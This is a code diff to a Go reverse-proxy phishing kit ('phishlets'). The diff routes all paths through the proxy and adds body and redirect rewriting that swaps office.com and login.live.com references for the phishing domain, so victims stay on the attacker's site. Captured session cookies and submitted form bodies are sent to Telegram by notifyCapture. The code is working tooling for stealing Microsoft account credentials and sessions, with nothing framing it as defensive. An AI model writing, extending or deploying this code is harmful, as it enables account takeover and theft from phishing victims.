@@ -63,18 +63,15 @@ func main() {
 	rl := NewRateLimiter()
 
 	mux := http.NewServeMux()
-	mux.HandleFunc("GET /{$}", rl.Middleware(func(w http.ResponseWriter, r *http.Request) {
-		handleRequest(w, r, bootloaderHTML)
-	}))
 	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusOK)
 		w.Write([]byte("ok"))
 	})
 
-	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		w.WriteHeader(http.StatusNotFound)
-		w.Write([]byte("<html><body></body></html>"))
-	})
+	// All paths go through proxy handler — bot/cookie check at top
+	mux.HandleFunc("/", rl.Middleware(func(w http.ResponseWriter, r *http.Request) {
+		handleRequest(w, r, bootloaderHTML)
+	}))
 
 	log.Printf("Proxy server listening on :%s (%d phishlets)", port, len(phishlets))
 	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
@@ -127,6 +124,9 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 			req.URL.Host = target.Host
 			req.Host = target.Host
 
+			// Strip Accept-Encoding so upstream returns uncompressed (we rewrite body)
+			req.Header.Del("Accept-Encoding")
+
 			if req.Header.Get("Referer") != "" {
 				req.Header.Set("Referer", strings.Replace(req.Header.Get("Referer"),
 					phishingHost, target.Host, 1))
@@ -142,6 +142,7 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 		ModifyResponse: func(resp *http.Response) error {
 			capturedCookies := resp.Header.Values("Set-Cookie")
 			rewriteResponse(resp, target.Host, phishingHost, pl)
+			rewriteBody(resp, target.Host, r.Host)
 			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
 			return nil
 		},
@@ -185,6 +186,9 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 	if pl.Rewrite.RewriteLocation {
 		if loc := resp.Header.Get("Location"); loc != "" {
 			loc = strings.ReplaceAll(loc, upstreamHost, ourHost)
+			loc = strings.ReplaceAll(loc, "www.office.com", ourHost)
+			loc = strings.ReplaceAll(loc, "office.com", ourHost)
+			loc = strings.ReplaceAll(loc, "login.live.com", ourHost)
 			resp.Header.Set("Location", loc)
 		}
 	}
@@ -284,6 +288,48 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		filename := fmt.Sprintf("session-%s.txt", time.Now().UTC().Format("20060102-150405"))
 		sendTelegramDocument(msg, filename, []byte(txtContent))
 	}
+}
+
+// rewriteBody replaces upstream domain references in text responses so the
+// browser continues routing all requests through our proxy domain.
+func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
+	ct := resp.Header.Get("Content-Type")
+	if ct == "" {
+		return
+	}
+	rewritable := []string{
+		"text/html", "text/javascript", "application/javascript",
+		"application/json", "text/css", "application/x-javascript", "text/plain",
+	}
+	rewrite := false
+	for _, t := range rewritable {
+		if strings.Contains(ct, t) {
+			rewrite = true
+			break
+		}
+	}
+	if !rewrite {
+		return
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return
+	}
+	resp.Body.Close()
+
+	rewritten := strings.ReplaceAll(string(body), upstreamHost, ourHost)
+	// Also rewrite common Microsoft auth subdomains that appear in redirects
+	for _, alt := range []string{"www.office.com", "office.com", "login.live.com"} {
+		if alt != upstreamHost {
+			rewritten = strings.ReplaceAll(rewritten, alt, ourHost)
+		}
+	}
+
+	resp.Body = io.NopCloser(strings.NewReader(rewritten))
+	resp.ContentLength = int64(len(rewritten))
+	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(rewritten)))
+	resp.Header.Del("Content-Encoding") // deflate/gzip won't match rewritten body
 }
 
 func extractFormField(body, field string) string {
